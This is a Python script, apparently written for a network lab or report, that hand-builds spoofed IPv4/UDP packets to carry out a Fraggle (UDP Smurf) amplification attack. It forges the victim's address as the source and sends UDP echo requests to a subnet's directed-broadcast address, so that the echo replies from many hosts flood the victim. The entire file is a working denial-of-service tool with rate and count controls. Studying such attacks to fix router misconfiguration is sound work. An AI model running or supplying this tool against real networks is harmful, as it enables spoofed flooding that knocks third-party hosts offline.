#!/usr/bin/env python3
"""fraggle.py — hand-rolled Fraggle-attack packet generator (UDP Smurf variant).

The Fraggle attack is Smurf with UDP instead of ICMP: instead of a broadcast
*echo request*, the attacker sends a spoofed UDP datagram to the UDP *echo* port
(7) of a subnet DIRECTED BROADCAST. Every host running an echo service answers the
victim, so N hosts turn 1 request into N replies — identical amplification, a
different protocol. This is the point the report makes: the router misconfiguration
(forwarding directed broadcasts), not the protocol, is the root cause.

Every header byte and BOTH checksums are computed here — no hping/nping/scapy. The
UDP checksum is the interesting one: it covers a 12-byte *pseudo-header* (src IP,
dst IP, protocol, UDP length) in addition to the UDP header and payload (RFC 768).

Run inside the attacker namespace as root, e.g.:
    ip netns exec attacker python3 fraggle.py --victim 10.0.20.100 \
        --broadcast 10.0.10.255 --dport 7 --sport 40000 --count 100 --rate 50

Fields set: IP src=victim (spoofed), dst=broadcast, proto=17(UDP), recomputed IP
checksum; UDP sport/dport/length, checksum over pseudo-header+UDP header+payload.
"""
import argparse
import socket
import struct
import sys
import time


def checksum(data: bytes) -> int:
    """16-bit one's-complement Internet checksum (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]   # sum 16-bit big-endian words
    total = (total >> 16) + (total & 0xFFFF)     # fold carries
    total += total >> 16
    return (~total) & 0xFFFF


def build_ip_header(src: str, dst: str, payload_len: int, ip_id: int) -> bytes:
    total_len = 20 + payload_len
    ihl_ver = (4 << 4) | 5           # IPv4, 5 * 4 = 20-byte header
    fields = (
        ihl_ver, 0, total_len, ip_id, 0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    header = struct.pack("!BBHHHBBH4s4s", *fields)          # checksum = 0
    chk = checksum(header)
    fields = fields[:7] + (chk,) + fields[8:]
    return struct.pack("!BBHHHBBH4s4s", *fields)            # checksum filled


def build_udp(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    udp_len = 8 + len(payload)
    # UDP checksum is computed over a pseudo-header + the UDP header + payload.
    pseudo = (
        socket.inet_aton(src) + socket.inet_aton(dst)
        + struct.pack("!BBH", 0, socket.IPPROTO_UDP, udp_len)
    )
    head0 = struct.pack("!HHHH", sport, dport, udp_len, 0)  # checksum = 0
    chk = checksum(pseudo + head0 + payload)
    # A computed UDP checksum of 0 is transmitted as 0xFFFF (0 means "none").
    if chk == 0:
        chk = 0xFFFF
    head = struct.pack("!HHHH", sport, dport, udp_len, chk)
    return head + payload


def main() -> int:
    ap = argparse.ArgumentParser(description="Hand-crafted Fraggle (UDP Smurf) sender.")
    ap.add_argument("--victim", required=True, help="spoofed source (flood target)")
    ap.add_argument("--broadcast", required=True, help="subnet directed-broadcast dst")
    ap.add_argument("--dport", type=int, default=7, help="UDP dest port (echo=7)")
    ap.add_argument("--sport", type=int, default=40000, help="spoofed source port")
    ap.add_argument("--count", type=int, default=100, help="requests to send (default 100)")
    ap.add_argument("--rate", type=float, default=50.0, help="packets/sec (default 50)")
    ap.add_argument("--size", type=int, default=0, help="UDP payload bytes (default 0)")
    args = ap.parse_args()

    if args.rate <= 0:
        ap.error("--rate must be > 0")
    if args.size < 0:
        ap.error("--size must be >= 0")

    # A recognizable payload; even 0 bytes amplifies (it's the reply count that matters).
    payload = bytes((0x41 + (i % 26)) for i in range(args.size)) or b"FRAGGLE"
    interval = 1.0 / args.rate

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("error: raw socket needs root (run under sudo / ip netns exec).", file=sys.stderr)
        return 1
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    udp = build_udp(args.victim, args.broadcast, args.sport, args.dport, payload)
    ip_header = build_ip_header(args.victim, args.broadcast, len(udp), 0x1234)
    pkt = ip_header + udp
    sent = 0
    print(f"fraggle.py: src={args.victim}:{args.sport} (spoofed) -> "
          f"dst={args.broadcast}:{args.dport}  count={args.count} rate={args.rate}pps "
          f"payload={len(payload)}B")
    try:
        for _ in range(args.count):
            s.sendto(pkt, (args.broadcast, 0))
            sent += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()
    print(f"fraggle.py: sent {sent} spoofed UDP echo requests")
    return 0


if __name__ == "__main__":
    sys.exit(main())
